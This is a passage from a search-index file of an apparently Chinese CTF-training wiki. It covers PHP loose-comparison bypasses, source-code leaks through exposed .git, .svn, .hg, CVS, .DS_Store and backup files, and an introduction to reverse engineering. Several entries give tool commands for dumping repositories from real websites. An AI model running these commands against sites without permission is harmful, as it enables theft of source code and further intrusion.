\u4e0d\u4f1a\u62a5\u9519\uff0c\u53ea\u662f\u4f1a\u65e0\u6cd5\u6b63\u786e\u5730\u6c42\u51fa array \u7684 md5 \u503c\uff0c\u8fd9\u6837\u5c31\u4f1a\u5bfc\u81f4\u4efb\u610f 2 \u4e2a array \u7684 md5 \u503c\u90fd\u4f1a\u76f8\u7b49\u3002  strcmp()  strcmp()  \u51fd\u6570\u5728 PHP \u5b98\u65b9\u624b\u518c\u4e2d\u7684\u63cf\u8ff0\u662f  intstrcmp ( string $str1 \uff0c string $str2 ) \uff0c\u9700\u8981\u7ed9  strcmp()  \u4f20\u9012 2 \u4e2a  string  \u7c7b\u578b\u7684\u53c2\u6570\u3002\u5982\u679c  str1  \u5c0f\u4e8e  str2 \uff0c\u8fd4\u56de -1\uff0c\u76f8\u7b49\u8fd4\u56de 0\uff0c\u5426\u5219\u8fd4\u56de 1\u3002 strcmp()  \u51fd\u6570\u6bd4\u8f83\u5b57\u7b26\u4e32\u7684\u672c\u8d28\u662f\u5c06\u4e24\u4e2a\u53d8\u91cf\u8f6c\u6362\u4e3a ASCII\uff0c\u7136\u540e\u8fdb\u884c\u51cf\u6cd5\u8fd0\u7b97\uff0c\u7136\u540e\u6839\u636e\u8fd0\u7b97\u7ed3\u679c\u6765\u51b3\u5b9a\u8fd4\u56de\u503c\u3002  \u5982\u679c\u4f20\u5165\u7ed9\u51fa  strcmp()  \u7684\u53c2\u6570\u662f\u6570\u5b57\u5462\uff1f  $array=[1,2,3];  var_dump(strcmp($array, 123 )); //null,\u5728\u67d0\u79cd\u610f\u4e49\u4e0anull\u4e5f\u5c31\u662f\u76f8\u5f53\u4e8efalse\u3002   switch()  \u5982\u679c  switch()  \u662f\u6570\u5b57\u7c7b\u578b\u7684 case \u7684\u5224\u65ad\u65f6\uff0cswitch \u4f1a\u5c06\u5176\u4e2d\u7684\u53c2\u6570\u8f6c\u6362\u4e3a int \u7c7b\u578b\u3002\u5982\u4e0b\uff1a  $i = 2abc ;  switch ($i) {  case 0:  case 1:  case 2:   echo  i is less than 3 but not negative ;   break;  case 3:   echo  i is 3 ;  }   \u8fd9\u4e2a\u65f6\u5019\u7a0b\u5e8f\u8f93\u51fa\u7684\u662f  i is less than 3 but not negative  \uff0c\u662f\u7531\u4e8e  switch()  \u51fd\u6570\u5c06  $i  \u8fdb\u884c\u4e86\u7c7b\u578b\u8f6c\u6362\uff0c\u8f6c\u6362\u7ed3\u679c\u4e3a 2\u3002  in_array()  \u5728 PHP \u624b\u518c\u4e2d\uff0c  in_array()  \u51fd\u6570\u7684\u89e3\u91ca\u662f  bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )  ,\u5982\u679cstrict\u53c2\u6570\u6ca1\u6709\u63d0\u4f9b\uff0c\u90a3\u4e48in_array\u5c31\u4f1a\u4f7f\u7528\u677e\u6563\u6bd4\u8f83\u6765\u5224\u65ad  $needle  \u662f\u5426\u5728  $haystack  \u4e2d\u3002\u5f53 strince \u7684\u503c\u4e3a true \u65f6\uff0c  in_array()  \u4f1a\u6bd4\u8f83 needls \u7684\u7c7b\u578b\u548c haystack \u4e2d\u7684\u7c7b\u578b\u662f\u5426\u76f8\u540c\u3002  $array=[0,1,2, 3 ];  var_dump(in_array( abc , $array)); //true  var_dump(in_array( 1bc , $array)); //true   \u53ef\u4ee5\u770b\u5230\u4e0a\u9762\u7684\u60c5\u51b5\u8fd4\u56de\u7684\u90fd\u662f true\uff0c\u56e0\u4e3a  'abc'  \u4f1a\u8f6c\u6362\u4e3a 0\uff0c  '1bc'  \u8f6c\u6362\u4e3a 1\u3002  array_search()  \u4e0e  in_array()  \u4e5f\u662f\u4e00\u6837\u7684\u95ee\u9898\u3002", 
            "title": "\u5185\u7f6e\u51fd\u6570\u7684\u53c2\u6570\u7684\u677e\u6563\u6027"
        }, 
        {
            "location": "/web/php/#_18", 
            "text": "", 
            "title": "\u5bfb\u627e\u6e90\u4ee3\u7801\u5907\u4efd"
        }, 
        {
            "location": "/web/php/#hg", 
            "text": "hg init  \u65f6\u4f1a\u4ea7\u751f  .hg  \u6587\u4ef6\u3002  \u5229\u7528\u5de5\u5177 dvcs-ripper", 
            "title": "hg \u6e90\u7801\u6cc4\u9732"
        }, 
        {
            "location": "/web/php/#git", 
            "text": ".git  \u76ee\u5f55\u5185\u6709\u4ee3\u7801\u7684\u53d8\u66f4\u8bb0\u5f55\u7b49\u6587\u4ef6\uff0c\u5982\u679c\u90e8\u7f72\u65f6\u8be5\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u53ef\u88ab\u8bbf\u95ee\uff0c\u53ef\u80fd\u4f1a\u88ab\u5229\u7528\u6765\u6062\u590d\u6e90\u4ee3\u7801\u3002  /.git\n/.git/HEAD\n/.git/index\n/.git/config\n/.git/description  GitHack  python GitHack.py http://www.openssl.org/.git/  GitHacker\uff08\u53ef\u6062\u590d\u5b8c\u6574 Git \u4ed3\u5e93\uff09  python GitHacker.py http://www.openssl.org/.git/", 
            "title": "Git \u6e90\u7801\u6cc4\u9732"
        }, 
        {
            "location": "/web/php/#ds_store", 
            "text": "Mac OS \u4e2d\u4f1a\u5305\u542b\u6709  .DS_Store  \u6587\u4ef6\uff0c\u5305\u542b\u6587\u4ef6\u540d\u7b49\u4fe1\u606f\u3002  \u5229\u7528\u5de5\u5177 ds\uff3fstore\uff3fexp  python ds_store_exp.py http://hd.zj.qq.com/themes/galaxyw/.DS_Store\n\nhd.zj.qq.com/\n\u2514\u2500\u2500 themes\n    \u2514\u2500\u2500 galaxyw\n        \u251c\u2500\u2500 app\n        \u2502   \u2514\u2500\u2500 css\n        \u2502       \u2514\u2500\u2500 style.min.css\n        \u251c\u2500\u2500 cityData.min.js\n        \u251c\u2500\u2500 images\n        \u2502   \u2514\u2500\u2500 img\n        \u2502       \u251c\u2500\u2500 bg-hd.png\n        \u2502       \u251c\u2500\u2500 bg-item-activity.png\n        \u2502       \u251c\u2500\u2500 bg-masker-pop.png\n        \u2502       \u251c\u2500\u2500 btn-bm.png\n        \u2502       \u251c\u2500\u2500 btn-login-qq.png\n        \u2502       \u251c\u2500\u2500 btn-login-wx.png\n        \u2502       \u251c\u2500\u2500 ico-add-pic.png\n        \u2502       \u251c\u2500\u2500 ico-address.png\n        \u2502       \u251c\u2500\u2500 ico-bm.png\n        \u2502       \u251c\u2500\u2500 ico-duration-time.png\n        \u2502       \u251c\u2500\u2500 ico-pop-close.png\n        \u2502       \u251c\u2500\u2500 ico-right-top-delete.png\n        \u2502       \u251c\u2500\u2500 page-login-hd.png\n        \u2502       \u251c\u2500\u2500 pic-masker.png\n        \u2502       \u2514\u2500\u2500 ticket-selected.png\n        \u2514\u2500\u2500 member\n            \u251c\u2500\u2500 assets\n            \u2502   \u251c\u2500\u2500 css\n            \u2502   \u2502   \u251c\u2500\u2500 ace-reset.css\n            \u2502   \u2502   \u2514\u2500\u2500 antd.css\n            \u2502   \u2514\u2500\u2500 lib\n            \u2502       \u251c\u2500\u2500 cityData.min.js\n            \u2502       \u2514\u2500\u2500 ueditor\n            \u2502           \u251c\u2500\u2500 index.html\n            \u2502           \u251c\u2500\u2500 lang\n            \u2502           \u2502   \u2514\u2500\u2500 zh-cn\n            \u2502           \u2502       \u251c\u2500\u2500 images\n            \u2502           \u2502       \u2502   \u251c\u2500\u2500 copy.png\n            \u2502           \u2502       \u2502   \u251c\u2500\u2500 localimage.png\n            \u2502           \u2502       \u2502   \u251c\u2500\u2500 music.png\n            \u2502           \u2502       \u2502   \u2514\u2500\u2500 upload.png\n            \u2502           \u2502       \u2514\u2500\u2500 zh-cn.js\n            \u2502           \u251c\u2500\u2500 php\n            \u2502           \u2502   \u251c\u2500\u2500 action_crawler.php\n            \u2502           \u2502   \u251c\u2500\u2500 action_list.php\n            \u2502           \u2502   \u251c\u2500\u2500 action_upload.php\n            \u2502           \u2502   \u251c\u2500\u2500 config.json\n            \u2502           \u2502   \u251c\u2500\u2500 controller.php\n            \u2502           \u2502   \u2514\u2500\u2500 Uploader.class.php\n            \u2502           \u251c\u2500\u2500 ueditor.all.js\n            \u2502           \u251c\u2500\u2500 ueditor.all.min.js\n            \u2502           \u251c\u2500\u2500 ueditor.config.js\n            \u2502           \u251c\u2500\u2500 ueditor.parse.js\n            \u2502           \u2514\u2500\u2500 ueditor.parse.min.js\n            \u2514\u2500\u2500 static\n                \u251c\u2500\u2500 css\n                \u2502   \u2514\u2500\u2500 page.css\n                \u251c\u2500\u2500 img\n                \u2502   \u251c\u2500\u2500 bg-table-title.png\n                \u2502   \u251c\u2500\u2500 bg-tab-say.png\n                \u2502   \u251c\u2500\u2500 ico-black-disabled.png\n                \u2502   \u251c\u2500\u2500 ico-black-enabled.png\n                \u2502   \u251c\u2500\u2500 ico-coorption-person.png\n                \u2502   \u251c\u2500\u2500 ico-miss-person.png\n                \u2502   \u251c\u2500\u2500 ico-mr-person.png\n                \u2502   \u251c\u2500\u2500 ico-white-disabled.png\n                \u2502   \u2514\u2500\u2500 ico-white-enabled.png\n                \u2514\u2500\u2500 scripts\n                    \u251c\u2500\u2500 js\n                    \u2514\u2500\u2500 lib\n                        \u2514\u2500\u2500 jquery.min.js 21  directories,  48  files", 
            "title": ".DS_Store \u6587\u4ef6\u6cc4\u9732"
        }, 
        {
            "location": "/web/php/#_19", 
            "text": "\u7ba1\u7406\u5458\u5907\u4efd\u7f51\u7ad9\u6587\u4ef6\u540e\u9519\u8bef\u5730\u5c06\u5907\u4efd\u653e\u5728 Web \u76ee\u5f55\u4e0b\u3002  \u5e38\u89c1\u7684\u540e\u7f00\u540d\uff1a  .rar\n.zip\n.7z\n.tar\n.tar.gz\n.bak\n.txt", 
            "title": "\u7f51\u7ad9\u5907\u4efd\u6587\u4ef6"
        }, 
        {
            "location": "/web/php/#svn", 
            "text": "\u654f\u611f\u6587\u4ef6\uff1a  /.svn\n/.svn/wc.db\n/.svn/entries  dvcs-ripper  perl rip-svn.pl -v -u http://www.example.com/.svn/  Seay - SVN", 
            "title": "SVN \u6cc4\u9732"
        }, 
        {
            "location": "/web/php/#web-inf-webxml", 
            "text": "WEB-INF \u662f Java Web \u5e94\u7528\u7684\u5b89\u5168\u76ee\u5f55\uff0cweb.xml \u4e2d\u6709\u6587\u4ef6\u7684\u6620\u5c04\u5173\u7cfb\u3002  WEB-INF \u4e3b\u8981\u5305\u542b\u4e00\u4e0b\u6587\u4ef6\u6216\u76ee\u5f55\uff1a   /WEB-INF/web.xml  \uff1aWeb \u5e94\u7528\u7a0b\u5e8f\u914d\u7f6e\u6587\u4ef6\uff0c\u63cf\u8ff0\u4e86 servlet \u548c\u5176\u4ed6\u7684\u5e94\u7528\u7ec4\u4ef6\u914d\u7f6e\u53ca\u547d\u540d\u89c4\u5219\u3002  /WEB-INF/classes/  \uff1a\u542b\u4e86\u7ad9\u70b9\u6240\u6709\u7528\u7684 class \u6587\u4ef6\uff0c\u5305\u62ec servlet class \u548c\u975e servlet class\uff0c\u4ed6\u4eec\u4e0d\u80fd\u5305\u542b\u5728\u3002jar \u6587\u4ef6\u4e2d\u3002  /WEB-INF/lib/  \uff1a\u5b58\u653e web \u5e94\u7528\u9700\u8981\u7684\u5404\u79cd JAR \u6587\u4ef6\uff0c\u653e\u7f6e\u4ec5\u5728\u8fd9\u4e2a\u5e94\u7528\u4e2d\u8981\u6c42\u4f7f\u7528\u7684 jar \u6587\u4ef6\uff0c\u5982\u6570\u636e\u5e93\u9a71\u52a8 jar \u6587\u4ef6\u3002  /WEB-INF/src/  \uff1a\u6e90\u7801\u76ee\u5f55\uff0c\u6309\u7167\u5305\u540d\u7ed3\u6784\u653e\u7f6e\u5404\u4e2a java \u6587\u4ef6\u3002  /WEB-INF/database.properties  \uff1a\u6570\u636e\u5e93\u914d\u7f6e\u6587\u4ef6\u3002   \u901a\u8fc7\u627e\u5230 web.xml \u6587\u4ef6\uff0c\u63a8\u65ad class \u6587\u4ef6\u7684\u8def\u5f84\uff0c\u6700\u540e\u76f4\u63a5 class \u6587\u4ef6\uff0c\u5728\u901a\u8fc7\u53cd\u7f16\u8bd1 class \u6587\u4ef6\uff0c\u5f97\u5230\u7f51\u7ad9\u6e90\u7801\u3002 \u4e00\u822c\u60c5\u51b5\uff0cjsp \u5f15\u64ce\u9ed8\u8ba4\u90fd\u662f\u7981\u6b62\u8bbf\u95ee WEB-INF \u76ee\u5f55\u7684\uff0cNginx \u914d\u5408 Tomcat \u505a\u5747\u8861\u8d1f\u8f7d\u6216\u96c6\u7fa4\u7b49\u60c5\u51b5\u65f6\uff0c\u95ee\u9898\u539f\u56e0\u5176\u5b9e\u5f88\u7b80\u5355\uff0cNginx \u4e0d\u4f1a\u53bb\u8003\u8651\u914d\u7f6e\u5176\u4ed6\u7c7b\u578b\u5f15\u64ce\uff08Nginx \u4e0d\u662f jsp \u5f15\u64ce\uff09\u5bfc\u81f4\u7684\u5b89\u5168\u95ee\u9898\u800c\u5f15\u5165\u5230\u81ea\u8eab\u7684\u5b89\u5168\u89c4\u8303\u4e2d\u6765\uff08\u8fd9\u6837\u8026\u5408\u6027\u592a\u9ad8\u4e86\uff09\uff0c\u4fee\u6539 Nginx \u914d\u7f6e\u6587\u4ef6\u7981\u6b62\u8bbf\u95ee WEB-INF \u76ee\u5f55\u5c31\u597d\u4e86\uff1a  location   ~   ^/WEB-INF/*   {   deny   all ;   }   # \u6216\u8005return 404; \u6216\u8005\u5176\u4ed6\uff01", 
            "title": "WEB-INF / web.xml \u6cc4\u9732"
        }, 
        {
            "location": "/web/php/#cvs", 
            "text": "http://url/CVS/Root \u8fd4\u56de\u6839\u4fe1\u606f\nhttp://url/CVS/Entries \u8fd4\u56de\u6240\u6709\u6587\u4ef6\u7684\u7ed3\u6784  \u53d6\u56de\u6e90\u7801  bk clone http://url/name dir", 
            "title": "CVS \u6cc4\u9732"
        }, 
        {
            "location": "/reverse/introduction/", 
            "text": "\u5b9a\u4e49\n\n\n\u6307\u5bf9\u8f6f\u4ef6\u7684\u7ed3\u6784\uff0c\u6d41\u7a0b\uff0c\u7b97\u6cd5\uff0c\u4ee3\u7801\u7b49\u8fdb\u884c\u9006\u5411\u62c6\u89e3\u548c\u5206\u6790\u3002\n\n\n\u7814\u7a76\u76ee\u6807\n\n\n\u5bfc\u51fa\u8f6f\u4ef6\u4ea7\u54c1\u7684\u6e90\u4ee3\u7801\uff0c\u8bbe\u8ba1\u539f\u7406\uff0c\u7ed3\u6784\uff0c\u7b97\u6cd5\uff0c\u5904\u7406\u8fc7\u7a0b\uff0c\u8fd0\u884c\u65b9\u6cd5\u53ca\u76f8\u5173\u6587\u6863\u7b49\u3002\n\n\n\u5e94\u7528\u9886\u57df\n\n\n\u4e3b\u8981\u5e94\u7528\u4e8e\u8f6f\u4ef6\u7ef4\u62a4\uff0c\u8f6f\u4ef6\u7834\u89e3\uff0c\u6f0f\u6d1e\u6316\u6398\uff0c\u6076\u610f\u4ee3\u7801\u5206\u6790\u3002\n\n\n\u9006\u5411\u5206\u6790\u6d41\n\n\n\n\n\u7814\u7a76\u4fdd\u62a4\u65b9\u6cd5\uff0c\u53bb\u9664\u4fdd\u62a4\u529f\u80fd\n\n\n\u53cd\u6c47\u7f16\u76ee\u6807\u8f6f\u4ef6\uff0c\u8ddf\u8e2a\uff0c\u5206\u6790\u4ee3\u7801\u529f\u80fd\n\n\n\u751f\u6210\u76ee\u6807\u8f6f\u4ef6\u7684\u8bbe\u8ba1\u601d\u60f3\uff0c\u67b6\u6784\uff0c\u7b97\u6cd5\u7b49\u76f8\u5173\u6587\u6863\n\n\n\u6ce8\u5165\u4ee3\u7801\uff0c\u5f00\u53d1\u51fa\u66f4\u5b8c\u5584\u7684\u5e94\u7528\u8f6f\u4ef6\n\n\n\n\n\u8f6f\u4ef6\u9006\u5411\u7684\u5386\u53f2\n\n\n20 \u4e16\u7eaa 60 \u5e74\u4ee3\n\n\n\u4e3a\u633d\u6551\u7b2c\u4e8c\u4ee3\u8ba1\u7b97\u673a\u8f6f\u4ef6\u53ca\u52a0\u901f\u7b2c\u4e09\u4ee3\u8ba1\u7b97\u673a\u8f6f\u4ef6\u5f00\u53d1\uff0c\u7f8e\u56fd\u7814\u5236\u4e13\u7528\u53cd\u7f16\u8bd1\u5de5\u5177\u8fdb\u884c\u8f6f\u4ef6\u79fb\u690d\u3002\n\n\n1993 \u5e74\n\n\nChikofs \u7b49\u4eba\u4e8e\u53d1\u8d77\u9006\u5411\u5de5\u7a0b\u4f1a\u8bae\u5e76\u6bcf\u5e74\u4e3e\u884c\u4e00\u6b21\uff0c\u7814\u7a76\u548c\u8ba8\u8bba\u8f6f\u4ef6\u9006\u5411\u5de5\u7a0b\u7684\u95ee\u9898\uff0c\u6280\u672f\u53ca\u5176\u652f\u6301\u5de5\u5177\u3002\n\n\n80 \u5e74\u4ee3\u540e\u671f\u5230 90 \u5e74\u4ee3\n\n\n\u5173\u4e8e\u89e3\u51b3\u8f6f\u4ef6\u9006\u5411\u5de5\u7a0b\u548c\u8f6f\u4ef6\u7248\u6743\u7684\u77db\u76fe\u57fa\u672c\u4e0a\u6709\u4e86\u7ed3\u679c\uff0c\u5404\u56fd\u7eb7\u7eb7\u9488\u5bf9\u8f6f\u4ef6\u9006\u5411\u5de5\u7a0b\u8fdb\u884c\u7acb\u6cd5\uff0c\u4e0d\u662f\u7ea6\u675f\u800c\u662f\u89c4\u8303\u8be5\u9886\u57df\u7684\u7814\u7a76\u5de5\u4f5c\u3002\n\n\n2007 \u5e74 1 \u6708 17 \u65e5\n\n\n\u6700\u9ad8\u4eba\u6c11\u6cd5\u9662\u53d1\u5e03\u53f8\u6cd5\u89e3\u91ca\uff1a\u901a\u8fc7\u81ea\u884c\u5f00\u53d1\u7814\u5236\u6216\u8005\u53cd\u5411\u5de5\u7a0b\u7b49\u65b9\u5f0f\u83b7\u5f97\u7684\u5546\u4e1a\u79d8\u5bc6\uff0c\u5c06\u4e0d\u88ab\u8ba4\u5b9a\u4e3a\u53cd\u4e0d\u6b63\u5f53\u7ade\u4e89\u6cd5\u6709\u5173\u6761\u6b3e\u89c4\u5b9a\u7684\u4fb5\u72af\u5546\u4e1a\u79d8\u5bc6\u884c\u4e3a\u3002\n\n\n\u9006\u5411\u7814\u7a76\u7684\u76ee\u7684\u548c\u610f\u4e49\n\n\n\n\n\u5145\u5206\u5229\u7528\u548c\u6539\u9020\u73b0\u6709\u8f6f\u4ef6\uff0c\u5bf9\u73b0\u6709\u8f6f\u4ef6\u8fdb\u884c\u518d\u8bbe\u8ba1\uff0c\u518d\u5de5\u7a0b\uff0c\u4f7f\u8f6f\u4ef6\u529f\u80fd\u5f97\u5230\u5927\u5e45\u63d0\u9ad8\u4ee5\u6ee1\u8db3\u7528\u6237\u7684\u9700\u8981\n\n\n\u901a\u8fc7\u8f6f\u4ef6\u9006\u5411\u5de5\u7a0b\u5c06\u8fc7\u65f6\u7684\u8f6f\u4ef6\u7cfb\u7edf\u8f6c\u5316\u4e3a\u6613\u6f14\u5316\u7cfb\u7edf\n\n\n\u7834\u9664\u5546\u4e1a\u95ed\u6e90\uff0c\u6280\u672f\u4fdd\u62a4\uff08\u8fd9\u963b\u788d\u4e86\u8f6f\u4ef6\u79d1\u5b66\u7684\u53d1\u5c55\uff09\uff0c\u5f00\u653e\u6e90\u4ee3\u7801\n\n\n\n\nCTF\u7ade\u8d5b\u4e2d\u7684\u9006\u5411\n\n\n\n\n\u6d89\u53ca Windows\u3001Linux\u3001Android \u5e73\u53f0\u7684\u591a\u79cd\u7f16\u7a0b\u6280\u672f\uff0c\u8981\u6c42\u5229\u7528\u5e38\u7528\u5de5\u5177\u5bf9\u6e90\u4ee3\u7801\u53ca\u4e8c\u8fdb\u5236\u6587\u4ef6\u8fdb\u884c\u9006\u5411\u5206\u6790\uff0c\u638c\u63e1 Android \u79fb\u52a8\u5e94\u7528APK\u6587\u4ef6\u7684\u9006\u5411\u5206\u6790\uff0c\u638c\u63e1\u52a0\u89e3\u5bc6\u3001\u5185\u6838\u7f16\u7a0b\u3001\u7b97\u6cd5\u3001\u53cd\u8c03\u8bd5\u548c\u4ee3\u7801\u6df7\u6dc6\u6280\u672f\u3002\n------ \u300a\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u53c2\u8d5b\u6307\u5357\u300b\n\n\n\n\n\u8981\u6c42\n\n\n\n\n\u719f\u6089\u5982\u64cd\u4f5c\u7cfb\u7edf\uff0c\u6c47\u7f16\u8bed\u8a00\uff0c\u52a0\u89e3\u5bc6\u7b49\u76f8\u5173\u77e5\u8bc6\n\n\n\u5177\u6709\u4e30\u5bcc\u7684\u591a\u79cd\u9ad8\u7ea7\u8bed\u8a00\u7684\u7f16\u7a0b\u7ecf\u9a8c\n\n\n\u719f\u6089\u591a\u79cd\u7f16\u8bd1\u5668\u7684\u7f16\u8bd1\u539f\u7406\n\n\n\u8f83\u5f3a\u7684\u7a0b\u5e8f\u7406\u89e3\u548c\u9006\u5411\u5206\u6790\u80fd\u529b", 
            "title": "\u8f6f\u4ef6\u9006\u5411\u5de5\u7a0b\u7b80\u4ecb"
        }, 
        {
            "location": "/reverse/introduction/#_1", 
            "text": "\u6307\u5bf9\u8f6f\u4ef6\u7684\u7ed3\u6784\uff0c\u6d41\u7a0b\uff0c\u7b97\u6cd5\uff0c\u4ee3\u7801\u7b49\u8fdb\u884c\u9006\u5411\u62c6\u89e3\u548c\u5206\u6790\u3002", 
            "title": "\u5b9a\u4e49"
        }, 
        {
            "location": "/reverse/introduction/#_2", 
            "text": "\u5bfc\u51fa\u8f6f\u4ef6\u4ea7\u54c1\u7684\u6e90\u4ee3\u7801\uff0c\u8bbe\u8ba1\u539f\u7406\uff0c\u7ed3\u6784\uff0c\u7b97\u6cd5\uff0c\u5904\u7406\u8fc7\u7a0b\uff0c\u8fd0\u884c\u65b9\u6cd5\u53ca\u76f8\u5173\u6587\u6863\u7b49\u3002", 
            "title": "\u7814\u7a76\u76ee\u6807"
        }, 
        {
            "location": "/reverse/introduction/#_3", 
            "text": "\u4e3b\u8981\u5e94\u7528\u4e8e\u8f6f\u4ef6\u7ef4\u62a4\uff0c\u8f6f\u4ef6\u7834\u89e3\uff0c\u6f0f\u6d1e\u6316\u6398\uff0c\u6076\u610f\u4ee3\u7801\u5206\u6790\u3002", 
            "title": "\u5e94\u7528\u9886\u57df"
        }, 
        {
            "location": "/reverse/introduction/#_4", 
            "text": "\u7814\u7a76\u4fdd\u62a4\u65b9\u6cd5\uff0c\u53bb\u9664\u4fdd\u62a4\u529f\u80fd  \u53cd\u6c47\u7f16\u76ee\u6807\u8f6f\u4ef6\uff0c\u8ddf\u8e2a\uff0c\u5206\u6790\u4ee3\u7801\u529f\u80fd  \u751f\u6210\u76ee\u6807\u8f6f\u4ef6\u7684\u8bbe\u8ba1\u601d\u60f3\uff0c\u67b6\u6784\uff0c\u7b97\u6cd5\u7b49\u76f8\u5173\u6587\u6863  \u6ce8\u5165\u4ee3\u7801\uff0c\u5f00\u53d1\u51fa\u66f4\u5b8c\u5584\u7684\u5e94\u7528\u8f6f\u4ef6", 
            "title": "\u9006\u5411\u5206\u6790\u6d41"
        }, 
        {
            "location": "/reverse/introduction/#_5", 
            "text": "", 
            "title": "\u8f6f\u4ef6\u9006\u5411\u7684\u5386\u53f2"
        }, 
        {
            "location": "/reverse/introduction/#20-60", 
            "text": "\u4e3a\u633d\u6551\u7b2c\u4e8c\u4ee3\u8ba1\u7b97\u673a\u8f6f\u4ef6\u53ca\u52a0\u901f\u7b2c\u4e09\u4ee3\u8ba1\u7b97\u673a\u8f6f\u4ef6\u5f00\u53d1\uff0c\u7f8e\u56fd\u7814\u5236\u4e13\u7528\u53cd\u7f16\u8bd1\u5de5\u5177\u8fdb\u884c\u8f6f\u4ef6\u79fb\u690d\u3002", 
            "title": "20 \u4e16\u7eaa 60 \u5e74\u4ee3"
        }, 
        {
            "location": "/reverse/introduction/#1993", 
            "text": "Chikofs \u7b49\u4eba\u4e8e\u53d1\u8d77\u9006\u5411\u5de5\u7a0b\u4f1a\u8bae\u5e76\u6bcf\u5e74\u4e3e\u884c\u4e00\u6b21\uff0c\u7814\u7a76\u548c\u8ba8\u8bba\u8f6f\u4ef6\u9006\u5411\u5de5\u7a0b\u7684\u95ee\u9898\uff0c\u6280\u672f\u53ca\u5176\u652f\u6301\u5de5\u5177\u3002", 
            "title": "1993 \u5e74"
        }, 
        {
            "location": "/reverse/introduction/#80-90", 
            "text": "\u5173\u4e8e\u89e3\u51b3\u8f6f\u4ef6\u9006\u5411\u5de5\u7a0b\u548c\u8f6f\u4ef6\u7248\u6743\u7684\u77db\u76fe\u57fa\u672c\u4e0a\u6709\u4e86\u7ed3\u679c\uff0c\u5404\u56fd\u7eb7\u7eb7\u9488\u5bf9\u8f6f\u4ef6\u9006\u5411\u5de5\u7a0b\u8fdb\u884c\u7acb\u6cd5\uff0c\u4e0d\u662f\u7ea6\u675f\u800c\u662f\u89c4\u8303\u8be5\u9886\u57df\u7684\u7814\u7a76\u5de5\u4f5c\u3002", 
            "title": "80 \u5e74\u4ee3\u540e\u671f\u5230 90 \u5e74\u4ee3"
        }, 
        {
            "location": "/reverse/introduction/#2007-1-17", 
            "text": "\u6700\u9ad8\u4eba\u6c11\u6cd5\u9662\u53d1\u5e03\u53f8\u6cd5\u89e3\u91ca\uff1a\u901a\u8fc7\u81ea\u884c\u5f00\u53d1\u7814\u5236\u6216\u8005\u53cd\u5411\u5de5\u7a0b\u7b49\u65b9\u5f0f\u83b7\u5f97\u7684\u5546\u4e1a\u79d8\u5bc6\uff0c\u5c06\u4e0d\u88ab\u8ba4\u5b9a\u4e3a\u53cd\u4e0d\u6b63\u5f53\u7ade\u4e89\u6cd5\u6709\u5173\u6761\u6b3e\u89c4\u5b9a\u7684\u4fb5\u72af\u5546\u4e1a\u79d8\u5bc6\u884c\u4e3a\u3002", 
            "title": "2007 \u5e74 1 \u6708 17 \u65e5"
        }, 
        {
            "location": "/reverse/introduction/#_6", 
            "text": "\u5145\u5206\u5229\u7528\u548c\u6539\u9020\u73b0\u6709\u8f6f\u4ef6\uff0c\u5bf9\u73b0\u6709\u8f6f\u4ef6\u8fdb\u884c\u518d\u8bbe\u8ba1\uff0c\u518d\u5de5\u7a0b\uff0c\u4f7f\u8f6f\u4ef6\u529f\u80fd\u5f97\u5230\u5927\u5e45\u63d0\u9ad8\u4ee5\u6ee1\u8db3\u7528\u6237\u7684\u9700\u8981  \u901a\u8fc7\u8f6f\u4ef6\u9006\u5411\u5de5\u7a0b\u5c06\u8fc7\u65f6\u7684\u8f6f\u4ef6\u7cfb\u7edf\u8f6c\u5316\u4e3a\u6613\u6f14\u5316\u7cfb\u7edf  \u7834\u9664\u5546\u4e1a\u95ed\u6e90\uff0c\u6280\u672f\u4fdd\u62a4\uff08\u8fd9\u963b\u788d\u4e86\u8f6f\u4ef6\u79d1\u5b66\u7684\u53d1\u5c55\uff09\uff0c\u5f00\u653e\u6e90\u4ee3\u7801", 
            "title": "\u9006\u5411\u7814\u7a76\u7684\u76ee\u7684\u548c\u610f\u4e49"
        }, 
        {
            "location": "/reverse/introduction/#ctf", 
            "text": "\u6d89\u53ca Windows\u3001Linux\u3001Android \u5e73\u53f0\u7684\u591a\u79cd\u7f16\u7a0b\u6280\u672f\uff0c\u8981\u6c42\u5229\u7528\u5e38\u7528\u5de5\u5177\u5bf9\u6e90\u4ee3\u7801\u53ca\u4e8c\u8fdb\u5236\u6587\u4ef6\u8fdb\u884c\u9006\u5411\u5206\u6790\uff0c\u638c\u63e1 Android \u79fb\u52a8\u5e94\u7528APK\u6587\u4ef6\u7684\u9006\u5411\u5206\u6790\uff0c\u638c\u63e1\u52a0\u89e3\u5bc6\u3001\u5185\u6838\u7f16\u7a0b\u3001\u7b97\u6cd5\u3001\u53cd\u8c03\u8bd5\u548c\u4ee3\u7801\u6df7\u6dc6\u6280\u672f\u3002\n------ \u300a\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u53c2\u8d5b\u6307\u5357\u300b", 
            "title": "CTF\u7ade\u8d5b\u4e2d\u7684\u9006\u5411"
        }, 
        {
            "location": "/reverse/introduction/#_7", 
            "text": "\u719f\u6089\u5982\u64cd\u4f5c\u7cfb\u7edf\uff0c\u6c47\u7f16\u8bed\u8a00\uff0c\u52a0\u89e3\u5bc6\u7b49\u76f8\u5173\u77e5\u8bc6  \u5177\u6709\u4e30\u5bcc\u7684\u591a\u79cd\u9ad8\u7ea7\u8bed\u8a00\u7684\u7f16\u7a0b\u7ecf\u9a8c  \u719f\u6089\u591a\u79cd\u7f16\u8bd1\u5668\u7684\u7f16\u8bd1\u539f\u7406  \u8f83\u5f3a\u7684\u7a0b\u5e8f\u7406\u89e3\u548c\u9006\u5411\u5206\u6790\u80fd\u529b", 
            "title": "\u8981\u6c42"
        }, 
        {
            "location": "/reverse/unpack/packer-introduction/", 
